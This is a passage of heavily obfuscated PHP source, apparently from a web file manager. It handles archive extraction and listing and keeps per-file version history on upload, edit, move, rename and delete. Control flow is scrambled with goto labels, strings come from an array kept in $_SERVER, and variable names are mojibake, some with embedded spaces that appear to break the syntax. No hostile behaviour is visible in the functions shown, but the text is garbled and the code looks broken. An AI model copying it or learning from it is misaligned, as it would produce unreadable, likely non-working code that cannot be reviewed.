TEMP_FILES . $e¬‡ ÛÀ™; del_dir($c½ùºïÑˆ); goto aîã¡óÔòß; a“½†‡ÛÔÖ: if (!@file_exists(self::iconvSystem($Fô™óÅËç))) { $b …éŠ»ŒÛ = self::localFilePath($FİÃ’Õ–ê, $E“Ã¢×²ç„); $Fô™óÅËç = $b …éŠ»ŒÛ ? $b …éŠ»ŒÛ : parent::download($FİÃ’Õ–ê, $Fô™óÅËç); } $Fô™óÅËç = self::iconvSystem($Fô™óÅËç); $fØ©ßİš…¿ = isset($c“à½µ“‡[$f×¬§öÃßß[1060]]) ? $c“à½µ“‡[$f×¬§öÃßß[1060]] : $f×¬§öÃßß[1061]; goto CÛàğ¨³İ«; aë«µ»Å†: foreach ($f’ÌÁñ¿«¥ as $Cİ—µ—ê¡Ó) { $Cİ—µ—ê¡Ó = self::iconvApp($Cİ—µ—ê¡Ó); self::move($Cİ—µ—ê¡Ó, $c†ö è¥ˆÊ, $EšŠÊ‰×Ìè); } del_dir($c½ùºïÑˆ); if (!$b …éŠ»ŒÛ) { del_file($Fô™óÅËç); } goto b‹¸¶µË‚Ö; BíØ—£»í¼: if (!($cËîÄ´Ãù = parent::info($FİÃ’Õ–ê))) { show_json(LNG($f×¬§öÃßß[1059]), !1); } if (!($côÏ¹™¹£ = parent::infoFull($c†ö è¥ˆÊ))) { $c†ö è¥ˆÊ = parent::mkdir($c†ö è¥ˆÊ); $côÏ¹™¹£ = array($f×¬§öÃßß[85] => $c†ö è¥ˆÊ); } else { if (isset($côÏ¹™¹£[$f×¬§öÃßß[399]]) && trim($côÏ¹™¹£[$f×¬§öÃßß[85]], $f×¬§öÃßß[18]) != trim($c†ö è¥ˆÊ, $f×¬§öÃßß[18])) { $aÕ¢œ¼›è© = KodIO::make($côÏ¹™¹£[$f×¬§öÃßß[481]]); $AÕ›Çµ¿Û = parent::fileNameAuto($aÕ¢œ¼›è©, $côÏ¹™¹£[$f×¬§öÃßß[38]], REPEAT_RENAME_FOLDER, !0); $c†ö è¥ˆÊ = parent::mkdir($aÕ¢œ¼›è© . $AÕ›Çµ¿Û); $côÏ¹™¹£ = array($f×¬§öÃßß[85] => $c†ö è¥ˆÊ); } } $c†ö è¥ˆÊ = $côÏ¹™¹£[$f×¬§öÃßß[85]]; goto A§¨ôêŸ»Ÿ; e¤à Â‡—Î: Hook::trigger($f×¬§öÃßß[1065], $c½ùºïÑˆ); recursion_dir($c½ùºïÑˆ, $B„•Ş´øš, $dñî—³š¶Ä, 0); $f’ÌÁñ¿«¥ = array_merge($B„•Ş´øš, $dñî—³š¶Ä); goto aë«µ»Å†; CÛàğ¨³İ«: $F§Ù¡¾ĞÒé = KodArchive::extract($Fô™óÅËç, $c½ùºïÑˆ . $f×¬§öÃßß[18], $fØ©ßİš…¿); self::archiveExt(); if (!$F§Ù¡¾ĞÒé[$f×¬§öÃßß[1062]]) { show_json($f×¬§öÃßß[1063] . $F§Ù¡¾ĞÒé[$f×¬§öÃßß[1064]], !1); } goto e¤à Â‡—Î; dºê‘÷Š•÷: } public static function unzipList($Fªì¹æÑÓ°) { goto Bõ¡­Ò‹É; E¯¬ÄÓÓçã: $b­ÙÛæ³Œá = json_encode($f‚¹™¸†‹[$E§ñØˆÊì[1064]]); self::setContent($e¯’›«è¯á, $b­ÙÛæ³Œá); if (count($f‚¹™¸†‹[$E§ñØˆÊì[1064]]) >= $eˆùÃÛ‡ó„) { show_json(sprintf(LNG($E§ñØˆÊì[1068]), count($f‚¹™¸†‹[$E§ñØˆÊì[1064]])), !1); } goto D©°è÷É‘; A‹´’„¢: $e‹ƒØƒ„‡É = self::info($e­Ìä¸ô Ë); $dã¸øòÈŠï = self::fileExt($e‹ƒØƒ„‡É); $aÉ“‡È¥ß¼ = self::tmpFileName($e‹ƒØƒ„‡É); goto CØ’åÕ¡ä‚; c‹‡½µµøØ: if (!is_dir($b”ƒá‰ÚĞğ)) { mk_dir($b”ƒá‰ÚĞğ); } $dóğ¥ôˆ÷§ = $b”ƒá‰ÚĞğ . $E§ñØˆÊì[18] . $d„š²êÑï; if (!@file_exists(self::iconvSystem($dóğ¥ôˆ÷§))) { if (isset($e¡³ïŒ)) { url_request($A¾àà¿’Àì, $E§ñØˆÊì[1069], $dóğ¥ôˆ÷§); } else { $C¥´ÀªÏî¹ = self::localFilePath($A¾àà¿’Àì, $dã¸øòÈŠï); $dóğ¥ôˆ÷§ = $C¥´ÀªÏî¹ ? $C¥´ÀªÏî¹ : self::download($A¾àà¿’Àì, $dóğ¥ôˆ÷§); } } goto e‡ñ°‚á‰; CØ’åÕ¡ä‚: if (isset($e¡³ïŒ)) { $a¹Ø¼Ã¤Â„ = array($e¡³ïŒ[$E§ñØˆÊì[85]], $e¡³ïŒ[$E§ñØˆÊì[1066]], $e¡³ïŒ[$E§ñØˆÊì[38]]); $d„š²êÑï = md5(implode($E§ñØˆÊì[80], $a¹Ø¼Ã¤Â„)) . $E§ñØˆÊì[104] . get_path_ext($e¡³ïŒ[$E§ñØˆÊì[38]]); } else { $a¹Ø¼Ã¤Â„ = array($e‹ƒØƒ„‡É[$E§ñØˆÊì[38]], $e‹ƒØƒ„‡É[$E§ñØˆÊì[85]], $e‹ƒØƒ„‡É[$E§ñØˆÊì[87]]); $d„š²êÑï = md5(implode($E§ñØˆÊì[80], $a¹Ø¼Ã¤Â„)) . $E§ñØˆÊì[104] . $dã¸øòÈŠï; } if ($BÑ›ˆ‚ñ½ == -1) { $e¯’›«è¯á = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\x56\151\145\x77\x2f{$aÉ“‡È¥ß¼}\57{$d„š²êÑï}\x2e\154\x6f\147"; $EºïÍ£«È† = self::infoFull($e¯’›«è¯á); if ($EºïÍ£«È†) { $e¯’›«è¯á = $EºïÍ£«È†[$E§ñØˆÊì[85]]; $e”ßÓò¯õ¹ = self::getContent($e¯’›«è¯á); if ($e”ßÓò¯õ¹) { $b­ÙÛæ³Œá = json_decode($e”ßÓò¯õ¹, !0); if (count($b­ÙÛæ³Œá) >= $eˆùÃÛ‡ó„) { show_json(sprintf(LNG($E§ñØˆÊì[1068]), count($b­ÙÛæ³Œá)), !1); } return $b­ÙÛæ³Œá; } } else { $e¯’›«è¯á = self::mkfile($e¯’›«è¯á); } } $b”ƒá‰ÚĞğ = TEMP_FILES . $aÉ“‡È¥ß¼; goto c‹‡½µµøØ; D©°è÷É‘: return $f‚¹™¸†‹[$E§ñØˆÊì[1064]]; goto d»¦Š¦¦Êù; e‡ñ°‚á‰: $dóğ¥ôˆ÷§ = self::iconvSystem($dóğ¥ôˆ÷§); if ($BÑ›ˆ‚ñ½ >= 0) { $d»ñµÓõ°ƒ = isset($Fªì¹æÑÓ°[$E§ñØˆÊì[1070]]) ? $Fªì¹æÑÓ°[$E§ñØˆÊì[1070]] : !1; $Cí´ò½§èğ = isset($Fªì¹æÑÓ°[$E§ñØˆÊì[38]]) ? $Fªì¹æÑÓ°[$E§ñØˆÊì[38]] : $E§ñØˆÊì[43]; KodArchive::filePreview($dóğ¥ôˆ÷§, $BÑ›ˆ‚ñ½, $d»ñµÓõ°ƒ, $Cí´ò½§èğ); self::archiveExt(); die; } $f‚¹™¸†‹ = KodArchive::listContent($dóğ¥ôˆ÷§); goto Eà¨˜„×Õó; Eà¨˜„×Õó: self::archiveExt(); del_dir($b”ƒá‰ÚĞğ); if (!$f‚¹™¸†‹[$E§ñØˆÊì[1062]]) { show_json($f‚¹™¸†‹[$E§ñØˆÊì[1064]], !1); } goto E¯¬ÄÓÓçã; Eß¨–ßÒİ«: $eˆùÃÛ‡ó„ = 50000; if (request_url_safe($A¾àà¿’Àì)) { $e¡³ïŒ = parse_url_query($A¾àà¿’Àì); if (!isset($e¡³ïŒ[$E§ñØˆÊì[85]])) { show_json($E§ñØˆÊì[1067], !1); } } $e­Ìä¸ô Ë = isset($e¡³ïŒ) ? $e¡³ïŒ[$E§ñØˆÊì[85]] : $A¾àà¿’Àì; goto A‹´’„¢; Bõ¡­Ò‹É: $E§ñØˆÊì =& $_SERVER[¾÷]; $A¾àà¿’Àì = $Fªì¹æÑÓ°[$E§ñØˆÊì[85]]; $BÑ›ˆ‚ñ½ = isset($Fªì¹æÑÓ°[$E§ñØˆÊì[1066]]) ? $Fªì¹æÑÓ°[$E§ñØˆÊì[1066]] : -1; goto Eß¨–ßÒİ«; d»¦Š¦¦Êù: } private static function fileExt($Dõ®Ç‚áÌë) { $eŠ‰§Â£Æ– =& $_SERVER[¾÷]; $EÖÄ†ê©®„ = $Dõ®Ç‚áÌë[$eŠ‰§Â£Æ–[177]]; if ($EÖÄ†ê©®„ == $eŠ‰§Â£Æ–[1071]) { $fŒ›ëî´àö = $eŠ‰§Â£Æ–[1072]; if (substr($Dõ®Ç‚áÌë[$eŠ‰§Â£Æ–[38]], -strlen($fŒ›ëî´àö)) == $fŒ›ëî´àö) { $EÖÄ†ê©®„ = $eŠ‰§Â£Æ–[1073]; } } self::archiveExt($EÖÄ†ê©®„); return $EÖÄ†ê©®„; } private static function zipFileList($f¼Í‚¢…Ş, $F´Ø”†¾á• = false) { $cÚ˜å´´¤« =& $_SERVER[¾÷]; $CÀßŒˆ¨÷¬ = array(); foreach ($f¼Í‚¢…Ş as $eÉŒ°àÒà) { $b“ˆëå¡¿“ = $eÉŒ°àÒà[$cÚ˜å´´¤«[85]]; if ($F´Ø”†¾á•) { $b“ˆëå¡¿“ = self::copy($eÉŒ°àÒà[$cÚ˜å´´¤«[85]], $F´Ø”†¾á•, $cÚ˜å´´¤«[770]); } else { $f­™ùÍö…½ = self::init($eÉŒ°àÒà[$cÚ˜å´´¤«[85]]); if ($f­™ùÍö…½->getType() == $cÚ˜å´´¤«[115]) { $b“ˆëå¡¿“ = $f­™ùÍö…½->path; } } if ($b“ˆëå¡¿“ && self::local()->exist($b“ˆëå¡¿“)) { $CÀßŒˆ¨÷¬[$eÉŒ°àÒà[$cÚ˜å´´¤«[85]]] = $b“ˆëå¡¿“; } } if (!empty($CÀßŒˆ¨÷¬)) { return array_values($CÀßŒˆ¨÷¬); } show_json(LNG($cÚ˜å´´¤«[1037]), !1); } public static function tmpFileName($d§Ü‘ôˆ•Û) { $eà‹Ï×Óô =& $_SERVER[¾÷]; $B…™›„Âğ¾ = array($d§Ü‘ôˆ•Û[$eà‹Ï×Óô[38]], $d§Ü‘ôˆ•Û[$eà‹Ï×Óô[85]], $d§Ü‘ôˆ•Û[$eà‹Ï×Óô[87]], $d§Ü‘ôˆ•Û[$eà‹Ï×Óô[490]]); return md5(implode($eà‹Ï×Óô[80], $B…™›„Âğ¾)); } private static function localFilePath($d…ì¤Ú¸”›, $d£ïÁªÈ¶) { goto bä¡„øìÄ¢; C¹Ä…áÄÍ: if ($A¼©õ„‡¼î[$Eñ§çÑô•š[39]] == KodIO::KOD_SOURCE) { $cíš×¿ã™ = Model($Eñ§çÑô•š[776])->fileInfoGet(KodIO::sourceID($d…ì¤Ú¸”›)); if (!$cíš×¿ã™[$Eñ§çÑô•š[85]]) { show_json($Eñ§çÑô•š[1076], !1); } $d…ì¤Ú¸”› = $cíš×¿ã™[$Eñ§çÑô•š[85]]; } $fœàßƒæ‰ = self::init($d…ì¤Ú¸”›); $d‹Ëì”„ô = $fœàßƒæ‰->getType(); goto B‡Úôá…¬¶; bä¡„øìÄ¢: $Eñ§çÑô•š =& $_SERVER[¾÷]; if ($d£ïÁªÈ¶ == $Eñ§çÑô•š[1074] && strtoupper(substr(PHP_OS, 0, 3)) == $Eñ§çÑô•š[1075]) { return !1; } $A¼©õ„‡¼î = KodIO::parse($d…ì¤Ú¸”›); goto C¹Ä…áÄÍ; B‡Úôá…¬¶: if ($d‹Ëì”„ô == $Eñ§çÑô•š[115] || $d‹Ëì”„ô == $Eñ§çÑô•š[1077]) { if (!$fœàßƒæ‰->exist($fœàßƒæ‰->path)) { show_json(LNG($Eñ§çÑô•š[114]), !1); } return $fœàßƒæ‰->path; } return !1; goto d‚Ïº¶‹ÑÎ; d‚Ïº¶‹ÑÎ: } private static function archiveExt($Dğë›ë×Ü = '') { $GLOBALS[$_SERVER[¾÷][1078]] = $Dğë›ë×Ü; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto E‡ºì‰Ü’; eº÷äÖ‘’°: if (isset($_REQUEST[$dÎà†ó¡Ö¥[1080]]) && $_REQUEST[$dÎà†ó¡Ö¥[1080]] == $dÎà†ó¡Ö¥[96]) { return; } Hook::bind($dÎà†ó¡Ö¥[1081], $dÎà†ó¡Ö¥[1082]); Hook::bind($dÎà†ó¡Ö¥[1083], $dÎà†ó¡Ö¥[1084]); goto DôÇ»¾á‹—; AŞÙø‚‚Ú: Hook::bind($dÎà†ó¡Ö¥[1091], $dÎà†ó¡Ö¥[1092]); goto FõÚ‰‘ª£¯; DôÇ»¾á‹—: Hook::bind($dÎà†ó¡Ö¥[1085], $dÎà†ó¡Ö¥[1086]); Hook::bind($dÎà†ó¡Ö¥[1087], $dÎà†ó¡Ö¥[1088]); Hook::bind($dÎà†ó¡Ö¥[1089], $dÎà†ó¡Ö¥[1090]); goto AŞÙø‚‚Ú; E‡ºì‰Ü’: $dÎà†ó¡Ö¥ =& $_SERVER[¾÷]; $BÚØÒ¼Ò = $GLOBALS[$dÎà†ó¡Ö¥[16]][$dÎà†ó¡Ö¥[97]][$dÎà†ó¡Ö¥[1079]]; if ($BÚØÒ¼Ò <= 0) { return; } goto eº÷äÖ‘’°; FõÚ‰‘ª£¯: } public static function eventBeforeUpload($Eèöí‹µÇ¬) { if ($Eèöí‹µÇ¬[3] && $Eèöí‹µÇ¬[3] != REPEAT_REPLACE) { return; } $AËŠÇŸë×¼ = self::parsePath($Eèöí‹µÇ¬[0]); if (!$AËŠÇŸë×¼) { return; } self::add($AËŠÇŸë×¼); } public static function eventBeforeEdit($eİÌô¸â±) { $aŠ†¦ö¥³ = self::parsePath($eİÌô¸â±[0]); if (!$aŠ†¦ö¥³) { return; } self::add($aŠ†¦ö¥³); } public static function eventBeforeCopyFile($B…Ÿ‘™¤¦º, $f‰ØŒÆï¤Ğ, $FÛŒ…«‚Ò¬, $CÓ¬¢â«Š, $aùİˆíÂŸ, $föˆ¢²–ğ“) { $eŒ¢ÔŠÄ÷¶ = $FÛŒ…«‚Ò¬->getPathOuter($CÓ¬¢â«Š); $e•ÍÆĞÏå™ = self::parsePath($eŒ¢ÔŠÄ÷¶); if (!$e•ÍÆĞÏå™) { return; } self::add($e•ÍÆĞÏå™); } public static function eventBeforeRename($còåËŞãªø) { $c½±ªÒ =& $_SERVER[¾÷]; $aö„ëóÛ•‘ = self::parsePath($còåËŞãªø[0]); if (!$aö„ëóÛ•‘) { return; } $C¾Œª‚ÙÉ = self::checkInHistory($aö„ëóÛ•‘); if (!$C¾Œª‚ÙÉ) { return; } if ($C¾Œª‚ÙÉ[$c½±ªÒ[39]] == $c½±ªÒ[201]) { $Fè‡£æß» = self::listData($aö„ëóÛ•‘); if ($Fè‡£æß» && $Fè‡£æß»[$c½±ªÒ[374]]) { self::moveHistory($aö„ëóÛ•‘, $còåËŞãªø[1]); } } else { IO::rename($C¾Œª‚ÙÉ[$c½±ªÒ[85]], $còåËŞãªø[1]); } } public static function eventBeforeMove($fìÀ­îäØ«) { goto eºÄæÜ’Àç; c¨Û¤ÕŒ†º: $dÑ‹ØŠ›—ó = self::parsePath($fìÀ­îäØ«[1]); if (!$dÑ‹ØŠ›—ó) { return; } $fÏ§‰®õ… = $fìÀ­îäØ«[3]; goto dØ«äÕ´øà; dØ«äÕ´øà: $aƒóÕª‰‚ = self::checkInHistory($A­ÌÙ›ÏëÇ); if (!$aƒóÕª‰‚) { return; } $c’”ä“ÌŒÈ = self::pathHistory($dÑ‹ØŠ›—ó); goto eŠÊìÈÛ; eºÄæÜ’Àç: $cóµÊÎ¾“ =& $_SERVER[¾÷]; $A­ÌÙ›ÏëÇ = self::parsePath($fìÀ­îäØ«[0]); if (!$A­ÌÙ›ÏëÇ) { return; } goto c¨Û¤ÕŒ†º; eŠÊìÈÛ: if ($aƒóÕª‰‚[$cóµÊÎ¾“[39]] == $cóµÊÎ¾“[201]) { $D¢¢ÄÁµµŒ = self::listData($A­ÌÙ›ÏëÇ); $B—îÌŠ¬Ğ = rtrim($dÑ‹ØŠ›—ó, $cóµÊÎ¾“[18]) . $cóµÊÎ¾“[18] . ($fÏ§‰®õ… ? $fÏ§‰®õ… : get_path_this($A­ÌÙ›ÏëÇ)); $FĞ‚À¦÷Ş„ = self::listData($B—îÌŠ¬Ğ); if ($D¢¢ÄÁµµŒ && $D¢¢ÄÁµµŒ[$cóµÊÎ¾“[374]] && $FĞ‚À¦÷Ş„ && $FĞ‚À¦÷Ş„[$cóµÊÎ¾“[374]]) { return self::clear($A­ÌÙ›ÏëÇ); } if ($D¢¢ÄÁµµŒ && $D¢¢ÄÁµµŒ[$cóµÊÎ¾“[374]]) { self::moveHistory($A­ÌÙ›ÏëÇ, $fÏ§‰®õ…, $c’”ä“ÌŒÈ); } } else { IO::move($aƒóÕª‰‚[$cóµÊÎ¾“[85]], $c’”ä“ÌŒÈ, !1, $fÏ§‰®õ…); self::clearEmptyFolder(IO::pathFather($aƒóÕª‰‚[$cóµÊÎ¾“[85]])); } goto dõ“»İ°ƒæ; dõ“»İ°ƒæ: } public static function eventAfterRemove($EÏƒ“¬’Å, $e²šÖÉ¾Ïç) { goto b¹ÀÀ¬¿…•; D†ÆØÑõº·: if ($AœÎÚÒ“óÃ[$E”Ñà¿‘æÊ[39]] == $E”Ñà¿‘æÊ[201]) { $Bœ³ÙˆÔæÂ = self::listData($f”ƒ×ÕÄ“š, !1); if ($Bœ³ÙˆÔæÂ && $Bœ³ÙˆÔæÂ[$E”Ñà¿‘æÊ[374]]) { self::clear($f”ƒ×ÕÄ“š, !1); } } else { IO::remove($AœÎÚÒ“óÃ[$E”Ñà¿‘æÊ[85]]); self::clearEmptyFolder(IO::pathFather($AœÎÚÒ“óÃ[$E”Ñà¿‘æÊ[85]])); } goto f³¦íÃĞ; DŞ²ª”µÍ: if (!$f”ƒ×ÕÄ“š) { return; } $AœÎÚÒ“óÃ = self::checkInHistory($f”ƒ×ÕÄ“š); if (!$AœÎÚÒ“óÃ) { return; } goto D†ÆØÑõº·; b¹ÀÀ¬¿…•: $E”Ñà¿‘æÊ =& $_SERVER[¾÷]; if (!$e²šÖÉ¾Ïç) { return; } $f”ƒ×ÕÄ“š = self::parsePath($EÏƒ“¬’Å[0]); goto DŞ²ª”µÍ; f³¦íÃĞ: } private static function checkInHistory($cÙŒ„ò‡Û) { $AÉßƒğÏ¡ = self::pathHistory($cÙŒ„ò‡Û); if (!IO::exist($AÉßƒğÏ¡)) { $AÉßƒğÏ¡ .= $_SERVER[¾÷][1093]; } return IO::exist($AÉßƒğÏ¡) ? IO::info($AÉßƒğÏ¡) : !1; } private static function parsePath($ašèÜĞ‹¬Ü) { goto A„ŞË“ÛÄÁ; A„ŞË“ÛÄÁ: $B™ªø„ëä =& $_SERVER[¾÷]; if (!$ašèÜĞ‹¬Ü) { return !1; } if ($GLOBALS[$B™ªø„ëä[1094]]) { return; } goto E¤¼Å‡î‚»; cÌÔ—¢…Ê¯: if (!$BñäÏŸçï || !$cœ¡ø§àÎ”[$B™ªø„ëä[1095]]) { return !1; } if ($DŸÜ—ˆŠ¸İ == KodIO::KOD_SHARE_ITEM) { $FƒÉÀ„ö‹Í = IO::init($ašèÜĞ‹¬Ü); if ($FƒÉÀ„ö‹Í->pathParse[$B™ªø„ëä[1024]]) { return self::parsePath($FƒÉÀ„ö‹Í->pathParse[$B™ªø„ëä[1024]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto bôˆÆø¬ã¢; DÏƒšˆ§÷Ï: return $ašèÜĞ‹¬Ü; goto Bï´ƒËùò; E¤¼Å‡î‚»: $cœ¡ø§àÎ” = KodIO::parse($ašèÜĞ‹¬Ü); $DŸÜ—ˆŠ¸İ = $cœ¡ø§àÎ”[$B™ªø„ëä[39]]; $BñäÏŸçï = !$DŸÜ—ˆŠ¸İ || $DŸÜ—ˆŠ¸İ == KodIO::KOD_IO || $DŸÜ—ˆŠ¸İ == KodIO::KOD_SHARE_ITEM; goto cÌÔ—¢…Ê¯; bôˆÆø¬ã¢: $CÅ¥ÔÃ¤Ã— = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $B™ªø„ëä[1096]); foreach ($CÅ¥ÔÃ¤Ã— as $eğ¿ïØœÇ) { if (!$DŸÜ—ˆŠ¸İ && substr($ašèÜĞ‹¬Ü, 0, strlen($eğ¿ïØœÇ)) == $eğ¿ïØœÇ) { return !1; } } self::log($GLOBALS[$B™ªø„ëä[1019]] . $B™ªø„ëä[1097] . $ašèÜĞ‹¬Ü); goto DÏƒšˆ§÷Ï; Bï´ƒËùò: } private static function pathHistory($Cª„Ÿ‹ù—±) { $E­ÍÇ´¬ÍÖ =& $_SERVER[¾÷]; $eèóíØŒøç = self::$_historyBase . ltrim(KodIO::clear($Cª„Ÿ‹ù—±), $E­ÍÇ´¬ÍÖ[18]); $eèóíØŒøç = str_replace(array($E­ÍÇ´¬ÍÖ[1098]), array($E­ÍÇ´¬ÍÖ[1099]), $eèóíØŒøç); return $eèóíØŒøç; } public static function log($Aƒ¥Ù°¥µ) { } public static function historyCount($Bæ¨ÀòĞ) { $F×æÄİÀ‘ô =& $_SERVER[¾÷]; $a´Õšì©³¹ = array(); $bë‚çÃˆŸ½ = array(); foreach ($Bæ¨ÀòĞ as $Cø‚Ì´Û¤´) { $Eù­Âƒšï = get_path_father($Cø‚Ì´Û¤´); if (!$bë‚çÃˆŸ½[$Eù­Âƒšï]) { $bë‚çÃˆŸ½[$Eù­Âƒšï] = array(); } $bë‚çÃˆŸ½[$Eù­Âƒšï][] = get_path_this($Cø‚Ì´Û¤´); } foreach ($bë‚çÃˆŸ½ as $Eù­Âƒšï => $aŒÉ‘é—¬) { $a¢˜“¥ÇÏ = self::parsePath($Eù­Âƒšï); if (!$a¢˜“¥ÇÏ) { continue; } foreach ($aŒÉ‘é—¬ as $eÛËÁ¡¢§) { $CŒĞÄâÒÑÊ = self::listData(rtrim($a¢˜“¥ÇÏ, $F×æÄİÀ‘ô[18]) . $F×æÄİÀ‘ô[18] . $eÛËÁ¡¢§, !1); if ($CŒĞÄâÒÑÊ && $CŒĞÄâÒÑÊ[$F×æÄİÀ‘ô[374]]) { $a´Õšì©³¹[rtrim($Eù­Âƒšï, $F×æÄİÀ‘ô[18]) . $F×æÄİÀ‘ô[18] . $eÛËÁ¡¢§] = count($CŒĞÄâÒÑÊ[$F×æÄİÀ‘ô[374]]); } } } return $a´Õšì©³¹; } public static function add($EŞ¨ŞÓÓÊĞ) { goto dß³³íß¬›; dß³³íß¬›: $b¶‘•†° =& $_SERVER[¾÷]; $A†Ÿ‚·Ø¤ = self::listData($EŞ¨ŞÓÓÊĞ); if (!$A†Ÿ‚·Ø¤) { return; } goto fŞë­÷Úøê; DêÒÇù¿Ô³: if (!$cÂáëï†‹) { self::clearEmptyFolder($A†Ÿ‚·Ø¤[$b¶‘•†°[1105]]); return !1; } array_unshift($d‡…­¹Şâ , $C¸¯À¡ÒØ); if (count($d‡…­¹Şâ ) > $c¬•‰’áˆ´) { $BßÈ¨÷ê = array_slice($d‡…­¹Şâ , $c¬•‰’áˆ´); foreach ($BßÈ¨÷ê as $AÅ·ÌÒ¤ ) { IO::remove($A†Ÿ‚·Ø¤[$b¶‘•†°[1105]] . $AÅ·ÌÒ¤ [$b¶‘•†°[38]]); } $d‡…­¹Şâ  = array_slice($d‡…­¹Şâ , 0, $c¬•‰’áˆ´); } goto dİÖ“ñòõ·; fŞë­÷Úøê: $b‚ªìÀ‚¿‹ = Model($b¶‘•†°[1100])->get($b¶‘•†°[1101]); $Cê‡‘ï‰Á¯ = $GLOBALS[$b¶‘•†°[16]][$b¶‘•†°[97]][$b¶‘•†°[1079]]; $c¬•‰’áˆ´ = $b‚ªìÀ‚¿‹ == $b¶‘•†°[1102] ? 5 : $Cê‡‘ï‰Á¯; goto c·´çÆ´Ä; dİÖ“ñòõ·: return self::saveData($A†Ÿ‚·Ø¤[$b¶‘•†°[1106]], $d‡…­¹Şâ ); goto fóª¶«ãñ; c·´çÆ´Ä: if ($Cê‡‘ï‰Á¯ <= 0) { return; } $BøŞ´‰‡„Ñ = IO::hashSimple($EŞ¨ŞÓÓÊĞ); $bÌ¼øª¤…¼ = IO::info($EŞ¨ŞÓÓÊĞ); goto Bòí­¥„‰™; Bòí­¥„‰™: $d‡…­¹Şâ  = $A†Ÿ‚·Ø¤[$b¶‘•†°[374]]; if ($bÌ¼øª¤…¼[$b¶‘•†°[87]] == 0) { return; } if ($bÌ¼øª¤…¼[$b¶‘•†°[87]] >= 1024 * 1024 * 500) { return !1; } goto eïµ¹¯Ë¸Ê; a‹ƒµ‰óñÇ: $C¸¯À¡ÒØ = array($b¶‘•†°[397] => $c—®íëšñš, $b¶‘•†°[180] => $BøŞ´‰‡„Ñ, $b¶‘•†°[38] => $bÌ¼øª¤…¼[$b¶‘•†°[38]] . $b¶‘•†°[104] . date($b¶‘•†°[1103]) . rand_string(1), $b¶‘•†°[87] => $bÌ¼øª¤…¼[$b¶‘•†°[87]], $b¶‘•†°[435] => USER_ID, $b¶‘•†°[202] => time(), $b¶‘•†°[1104] => $b¶‘•†°[43]); IO::mkdir($A†Ÿ‚·Ø¤[$b¶‘•†°[1105]]); $cÂáëï†‹ = IO::copy($EŞ¨ŞÓÓÊĞ, $A†Ÿ‚·Ø¤[$b¶‘•†°[1105]], !1, $C¸¯À¡ÒØ[$b¶‘•†°[38]]); goto DêÒÇù¿Ô³; eïµ¹¯Ë¸Ê: if ($d‡…­¹Şâ  && $d‡…­¹Şâ [0][$b¶‘•†°[180]] == $BøŞ´‰‡„Ñ) { return !0; } if (array_key_exists($b¶‘•†°[204], $bÌ¼øª¤…¼) && !$bÌ¼øª¤…¼[$b¶‘•†°[204]]) { return !1; } $c—®íëšñš = short_id(time()); goto a‹ƒµ‰óñÇ; fóª¶«ãñ: } public static function remove($cœôàÄ¯í, $CÑ°˜åÖ) { $C  ¹‘à˜ =& $_SERVER[¾÷]; $b¶…ËÂ‚Ã = self::listData($cœôàÄ¯í); $AòÔ­ÅïÖ³ = array(); if (!$b¶…ËÂ‚Ã) { return !1; } foreach ($b¶…ËÂ‚Ã[$C  ¹‘à˜[374]] as $Eò¶ˆšÃÅÇ) { if ($Eò¶ˆšÃÅÇ[$C  ¹‘à˜[397]] == $CÑ°˜åÖ) { IO::remove($b¶…ËÂ‚Ã[$C  ¹‘à˜[1105]] . $Eò¶ˆšÃÅÇ[$C  ¹‘à˜[38]]); continue; } $AòÔ­ÅïÖ³[] = $Eò¶ˆšÃÅÇ; } return self::saveData($b¶…ËÂ‚Ã[$C  ¹‘à˜[1106]], $AòÔ­ÅïÖ³); } public static function clear($EáÂÀ’öæÌ, $A»¦×í¾¼í = true) { $d½† ¨âô =& $_SERVER[¾÷]; $C§³õĞ÷Š = self::listData($EáÂÀ’öæÌ, $A»¦×í¾¼í); if (!$C§³õĞ÷Š) { return !1; } foreach ($C§³õĞ÷Š[$d½† ¨âô[374]] as $a¶‚¸Ê©Ğ÷) { IO::remove($C§³õĞ÷Š[$d½† ¨âô[1105]] . $a¶‚¸Ê©Ğ÷[$d½† ¨âô[38]]); } return self::saveData($C§³õĞ÷Š[$d½† ¨âô[1106]], array()); } public static function moveHistory($døáˆÂøò, $b«¼ÚÁÑ– = '', $d—Ã®×Úíí = '') { goto aÚ„ŒóÛãâ; aÚ„ŒóÛãâ: $eÕ¼¡¿¯¼Œ =& $_SERVER[¾÷]; $Eš…Ñ¼Ì‹Ø = self::listData($døáˆÂøò, !1); if (!$Eš…Ñ¼Ì‹Ø || !$Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[374]]) { return !1; } goto a¨›Çİ¡ÌŸ; dãß”ĞôÒ‚: self::saveData($Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[1106]], $Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[374]]); self::clearEmptyFolder($Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[1105]]); goto d¿ æµŞÒÀ; a¨›Çİ¡ÌŸ: $B††Ûí™Û„ = $eÕ¼¡¿¯¼Œ[1093]; $b«¼ÚÁÑ– = $b«¼ÚÁÑ– ? $b«¼ÚÁÑ– : get_path_this($døáˆÂøò); $d—Ã®×Úíí = $d—Ã®×Úíí ? $d—Ã®×Úíí : $Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[1105]]; goto CÖ°†ÙÀŞ¥; CÖ°†ÙÀŞ¥: $B–¡òÎ‰â‡ = substr(get_path_this($Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[1106]]), 0, -strlen($B††Ûí™Û„)); foreach ($Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[374]] as $Dºíåß…¼Ã => $dò¨äÙí©Š) { $aóÄ‚ñåèŒ = $b«¼ÚÁÑ– . substr($dò¨äÙí©Š[$eÕ¼¡¿¯¼Œ[38]], strlen($B–¡òÎ‰â‡)); $b«ß‹³Ñ’Ì = IO::move($Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[1105]] . $dò¨äÙí©Š[$eÕ¼¡¿¯¼Œ[38]], $d—Ã®×Úíí, !1, $aóÄ‚ñåèŒ); if ($b«ß‹³Ñ’Ì) { 